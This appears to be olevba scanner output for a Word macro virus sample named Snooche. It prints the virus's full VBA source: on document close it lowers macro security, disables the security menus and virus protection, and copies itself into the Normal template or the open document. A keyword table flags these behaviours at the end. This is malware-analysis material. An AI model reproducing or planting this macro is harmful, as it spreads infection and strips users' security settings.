olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Snooche
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Snooche.cls 
in file: Virus.MSWord.Snooche - OLE stream: 'Macros/VBA/Snooche'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
 On Error Resume Next
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = 0
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  Else
    CommandBars("Tools").Controls("Macro").Enabled = 0
    Options.VirusProtection = 0
 End If
 Set vc = New DataObject
 Set ab = NormalTemplate.VBProject.VBComponents(1)
 Set cd = ActiveDocument.VBProject.VBComponents(1)
 With Snooche.VBProject.VBComponents(1).CodeModule
   vc.SetText .lines(1, .countoflines)
 End With
 If ab.Name <> "Snooche" Then
   With ab
    .CodeModule.deletelines 1, .CodeModule.countoflines
    .CodeModule.insertlines 1, vc.GetText
    .Name = "Snooche"
   End With
  ElseIf cd.Name <> "Snooche" Then
   With cd
    .CodeModule.deletelines 1, .CodeModule.countoflines
    .CodeModule.insertlines 1, vc.GetText
    .Name = "Snooche"
   End With
 End If
End Sub
    '[][][][][][][][][][][][][][][][][][][]'
    '[]        WM97/WM2K/Snooche         []'
    '[]         Psyclone X /DVC          []'
    '[]   For Educational Purposes Only  []'
    '[][][][][][][][][][][][][][][][][][][]'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

